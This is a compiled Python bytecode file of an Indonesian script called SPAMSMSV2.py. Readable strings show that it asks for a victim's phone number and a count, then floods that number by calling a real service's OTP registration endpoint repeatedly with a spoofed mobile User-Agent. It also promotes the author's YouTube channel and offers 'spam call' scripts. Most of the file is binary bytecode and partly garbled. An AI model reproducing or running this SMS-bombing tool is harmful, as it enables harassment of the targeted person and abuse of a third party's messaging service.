U
    w��^	  �                   @   s�   d dl Z d dlZd dlmZ d dlZd dlZd dlZd dlZdZdZdZ	dZ
dZdZd	Zd
ZdZdZdZdZdZdZdZdZdZdZdZdZddiZe�d� dZdd� Zdd� Zdd� Z e�  e �  dS ) �    N)�coloredz[32;1mz[0;32mz[34;1mz[36;1mz[31;1mz[0mz[37;1mz[35;1mz[3;1mz[33;1mz[0;33mz[30;1mz[31mz[1;32mz[33mz[34mz[35mz[36mz[37mz
User-AgentzzMozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36�clearz�

____ ___  ____ _  _    ____ _  _ ____ 
[__  |__] |__| |\/|    [__  |\/| [__  
___] |    |  | |  |    ___] |  | ___] 
VERSI : 0.1
c                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )N�
gl�l��?)�sys�stdout�write�flush�time�sleep)�s�i� r   �SPAMSMSV2.py�ketik'   s    
r   c               	   C   sP  t t� d�� t�d� t�d� t t� t � t t� d�d � t t� dt	� dt
� d�� t t� d	t	� dt� d
�� t t� dt	� dt� d�� t t� dt	� dt� dt� d�� t tdd�� ttdd��} tttdd���}t|�D ]d}t�d� tjd|  td�}d|jk�r"ttdd�� q�d|jk�r<ttd�� q�ttdd�� q�d S )NzBANTU SUBSCRIBE SAYA BROz%xdg-open https://youtu.be/Ujo4zAlKvGs�   �=�2   zAUTOR z: zABIN XD.5TXzYOUTUBE zBENJAMIN IDZ	INSTAGRAMZabinayanafaiq_�[�!z] zGUNAKAN DENGAN BIJAK!z2==================================================�redzNO TARGET: ZgreenzJUMLAH: �   z.https://core.ktbs.io/v2/user/registration/otp/)Zheaders�errorsZGAGALZTotalZSUKSESZblue)r   �zes�os�systemr	   r
   �mens�banner�z�kuli�sd�p�aqu�smar   �input�int�range�requests�get�ua�text�print)ZnoZjmlh�x�rr   r   r   �yaha,   s(    

 
r-   c                  C   s�   t t� dt� d�� t t� dt� d�� ttdd��} | dkrbt t� d�� t�d	� t�	d
� n6| dkr�t t� d�� t�d	� t�	d� n
t
�d� d S )Nz1. zCOBA SPAM SMS LAIN?z2. zPENGEN BUAT SCRIPT SPAM CALL?zPILIH: T UNTUK TIDAKr   �1zMEMBUKA LINK YOUTUBEr   z%xdg-open https://youtu.be/utL0Sxw5DSI�2z%xdg-open https://youtu.be/hcrVEua_4GQ�   )r   r   �ktr#   r   r   r	   r
   r   r   r   �exit)Zpilr   r   r   �ytE   s    

r3   )!r&   Z	termcolorr   r   r   r	   Zjson�g�gtZbt�b�m�cr    �ur   �kr1   �ar!   r   Zmenr   r"   Zsmpr   r   r(   r   r   r   r-   r3   r   r   r   r   �<module>   sB     �
